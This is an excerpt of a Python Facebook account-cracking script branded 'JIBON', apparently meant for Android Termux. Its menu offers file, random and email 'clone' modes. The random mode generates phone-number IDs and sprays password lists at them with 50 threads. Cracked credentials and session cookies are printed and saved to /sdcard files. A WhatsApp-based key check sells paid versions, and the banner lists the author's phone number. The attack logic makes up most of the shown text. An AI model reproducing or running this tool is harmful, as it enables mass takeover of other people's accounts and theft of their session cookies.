...
\____/___/_____/\____/_/ |_/   
                   ...
                   
\033[1;91m--------------------------------------------
\033[1;91m[*] CREATOR   > JIBON
\033[1;91m[*] FACEBOOK  > J  I  B  O  N 
\033[1;91m[*] GITHUB    > MRXJIBON
\033[1;91m[*] VERSION   > FREE
\033[1;91m[*] WHATSAPP  > +8801865544636
\033[1;91m-------------------------------------------"""  )
...
def menu():
	os.system('clear')
	banner()
	_JIBON_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_JIBON_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_JIBON_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_JIBON_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_JIBON_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____JIBON_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____JIBON_____ in ['1']:
		C1()
	if _____JIBON_____ in ['2']:
		Y2()
	if _____JIBON_____ in ['3']:
		BER()
	if _____JIBON_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL ")
	if _____JIBON_____ in ['0']:
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [JIBON] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('/sdcard/JIBON-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as JIBON:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            PARVEJ.submit(JIBON,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mJIBON-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/JIBON-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[JIBON-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801865544636?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20PARVEJ%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://wa.me/+8801865544636/JIBON/approved.txt/main/approved.%20txt').text
    if key1 in r:
